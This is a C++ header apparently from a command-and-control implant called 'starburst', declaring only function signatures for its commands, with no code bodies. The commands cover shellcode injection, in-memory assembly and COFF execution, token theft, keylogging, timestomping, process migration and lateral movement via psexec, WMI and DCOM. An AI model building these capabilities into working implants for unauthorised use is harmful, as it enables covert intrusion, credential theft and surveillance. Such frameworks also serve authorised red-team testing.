#ifndef STARBURST_COMMANDS_H
#define STARBURST_COMMANDS_H

#include <common.h>
#include <parser.h>

namespace starburst {

    typedef void (*CmdHandler)( instance& inst, char* task_uuid, Parser* params );

    struct CmdEntry {
        uint8_t    id;
        CmdHandler handler;
    };

#ifdef INCLUDE_CMD_EXIT
    auto declfn cmd_exit( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SLEEP
    auto declfn cmd_sleep( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SHELL
    auto declfn cmd_shell( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_WHOAMI
    auto declfn cmd_whoami( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_PWD
    auto declfn cmd_pwd( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_CD
    auto declfn cmd_cd( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_LS
    auto declfn cmd_ls( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_PS
    auto declfn cmd_ps( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_CONFIG
    auto declfn cmd_config( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_UPLOAD
    auto declfn cmd_upload( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
    auto declfn cmd_download( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SHINJECT
    auto declfn cmd_shinject( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_EXECUTE_PIC
    auto declfn cmd_execute_pic( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_CAT
    auto declfn cmd_cat( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_MKDIR
    auto declfn cmd_mkdir( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_RM
    auto declfn cmd_rm( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_CP
    auto declfn cmd_cp( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_MV
    auto declfn cmd_mv( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_ENV
    auto declfn cmd_env( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_REG_QUERY
    auto declfn cmd_reg_query( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SCREENSHOT
    auto declfn cmd_screenshot( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_TOKEN_LIST
    auto declfn cmd_token_list( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
    auto declfn cmd_execute_assembly( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_EXECUTE_COFF
    auto declfn cmd_execute_coff( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_JUMP_PSEXEC
    auto declfn cmd_jump_psexec( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_JUMP_SCSHELL
    auto declfn cmd_jump_scshell( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_JUMP_WMIEXEC
    auto declfn cmd_jump_wmiexec( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_JUMP_DCOMEXEC
    auto declfn cmd_jump_dcomexec( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_IFCONFIG
    auto declfn cmd_ifconfig( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_NETSTAT
    auto declfn cmd_netstat( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_KILL
    auto declfn cmd_kill( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_RUN
    auto declfn cmd_run( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_GETPRIVS
    auto declfn cmd_getprivs( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_LISTPIPES
    auto declfn cmd_listpipes( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_REG_WRITE_VALUE
    auto declfn cmd_reg_write_value( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_MAKE_TOKEN
    auto declfn cmd_make_token( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_STEAL_TOKEN
    auto declfn cmd_steal_token( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_REV2SELF
    auto declfn cmd_rev2self( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP
    auto declfn cmd_net_localgroup( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
    auto declfn cmd_net_localgroup_member( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_JOBKILL
    auto declfn cmd_jobkill( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_LINK
    auto declfn cmd_link( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_UNLINK
    auto declfn cmd_unlink( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
    auto declfn cmd_download_resp( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SOCKS
    auto declfn cmd_socks( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_SSH
    auto declfn cmd_ssh( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_RPFWD
    auto declfn cmd_rpfwd( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_MIGRATE
    auto declfn cmd_migrate( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_BLOCKDLLS
    auto declfn cmd_blockdlls( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_KEYLOG
    auto declfn cmd_keylog( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_ENUMDESKTOPS
    auto declfn cmd_enumdesktops( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_TIMESTOMP
    auto declfn cmd_timestomp( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_LOCALTIME
    auto declfn cmd_localtime( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_IDLETIME
    auto declfn cmd_idletime( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_GETUID
    auto declfn cmd_getuid( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_BROWSERPIVOT
    auto declfn cmd_browserpivot( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_CONNECT
    auto declfn cmd_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

#ifdef INCLUDE_CMD_DISCONNECT
    auto declfn cmd_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
#endif

}

#endif
